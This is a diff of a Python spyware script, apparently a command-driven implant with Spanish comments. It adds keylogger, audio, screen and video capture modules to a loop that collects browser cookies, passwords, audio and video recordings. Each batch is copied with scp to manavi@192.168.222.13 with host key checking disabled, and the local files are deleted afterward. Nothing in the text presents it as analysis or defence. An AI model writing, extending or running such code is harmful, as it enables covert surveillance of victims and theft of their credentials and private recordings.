@@ -1,6 +1,12 @@
 #!/usr/bin/python
 
 import os, re
+import capaudio
+import captura
+import capvideo
+import keylogger
+
+
 
 #Lista donde se almacenaran los comandos leidos del archivo
 comandos = [ ]
@@ -31,7 +37,7 @@ os.system("rm -f /tmp/comandos")
 for c in comandos:
     if c == "cookies":
        		os.system("python firecookies.py")	
-                os.system('scp -q -o StrictHostKeyChecking=no /tmp/cookies.txt manavi@192.168.222.13:~/cookies 1>/dev/null')
+                os.system('scp -q -o StrictHostKeyChecking=no /tmp/cookies.txt manavi@192.168.222.13:~/cookies/ 1>/dev/null')
                 os.system('rm -f /tmp/cookies.txt')
 
     elif c == "contrasenas":
@@ -55,12 +61,12 @@ for c in comandos:
  
     elif re.search('captvid',c):
                 mo = re.match('captvid (\d+)',c);
+                capvideo.video(mo.group(1))
                 os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.avi manavi@192.168.222.13:~/video/ 1>/dev/null')
                 os.system('rm -f /tmp/*.avi')
     
     elif re.search('captaud',c):
                 mo = re.match('captaud (\d+)',c);
-        
                 capaudio.audio(mo.group(1))
                 os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.wav manavi@192.168.222.13:~/audio/ 1>/dev/null')
                 os.system('rm -f /tmp/*.wav')
